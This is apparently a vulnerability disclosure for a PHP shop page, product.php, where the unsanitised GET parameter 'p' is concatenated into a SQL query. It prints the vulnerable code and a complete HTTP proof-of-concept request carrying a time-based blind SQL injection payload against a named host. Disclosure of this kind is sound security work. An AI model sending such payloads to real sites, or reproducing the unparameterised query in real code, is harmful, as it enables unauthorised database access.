### Vulnerability file address

`product.php` from line 60,The $product_id parameter is controllable, the parameter p can be passed through get, and the $product_id is not protected from sql injection, resulting in sql injection

```php
......
......
......
<?php 
include 'db.php';
$product_id = $_GET['p'];

$sql = " SELECT * FROM products ";
$sql = " SELECT * FROM products WHERE product_id = $product_id";
if (!$con) {
  die("Connection failed: " . mysqli_connect_error());
}
$result = mysqli_query($con, $sql);
......
......
......
```

### POC

```http
GET /product.php?p=1 AND (SELECT 9365 FROM (SELECT(SLEEP(5)))RcRq) HTTP/1.1
Host: www.onsp.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=acrlvk4ljcqdujn2orbd09in25
Upgrade-Insecure-Requests: 1
```

### Attack results pictures

![image-20220729151216485](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220729151216.png)

![image-20220729150245763](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220729150245.png)